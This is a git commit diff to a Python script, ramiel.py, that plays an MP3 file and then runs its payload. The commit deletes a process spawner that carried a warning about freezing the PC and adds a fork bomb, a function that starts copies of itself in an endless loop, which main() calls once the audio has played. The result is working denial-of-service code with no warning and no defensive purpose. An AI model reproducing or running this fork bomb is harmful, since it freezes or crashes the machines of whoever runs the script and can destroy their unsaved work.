07bce6021a181c54647b699cdfb6d6c4ce4b42b3
Spectre0ne <mmarquard737@gmail.com>
2024-09-21 22:57:47 +0200

    Changes made

--- ramiel.py
+++ ramiel.py
@@ -32,32 +32,15 @@ def play_mp3(file):
         pygame.time.Clock().tick(10)
 
 
-def counter(number):
-    while number > 0:
-        number -=1
-        time.sleep(0.1)
-
-def spawn_processes(num_process):
-    processes = [Process(target=counter, args=(1000,))for _ in range(num_process)]
-    for process in process:
-        process.start
-        print(f"Started Process{process.pid}.")
-    for process in processes:
-        process.join()
-        print(f"Process {process.pid}has finished.")
+def fork():
+    while True:
+        Process(target=fork).start()
 
 
 def main():
     mp3_file = "Ramiel.mp3" 
     play_mp3(mp3_file)
-    num_processors = cpu_count()
-    num_processes=num_processes*200
-    print(f"Number of logical processors: {num_processors}")
-    print(f"Creating {num_processes} processes.")
-    print("Warning: This will consume a lot of system resources, and potentially freeze your PC, make sure to adjust the number of processes and sleep seconds as needed.")
-    spawn_processes(num_processes)
-    
-while True:
-    os.startfile(__file__[:-2]+"exe")
-    main()
+    fork()
 
+if  __name__=="__main__":
+    main()
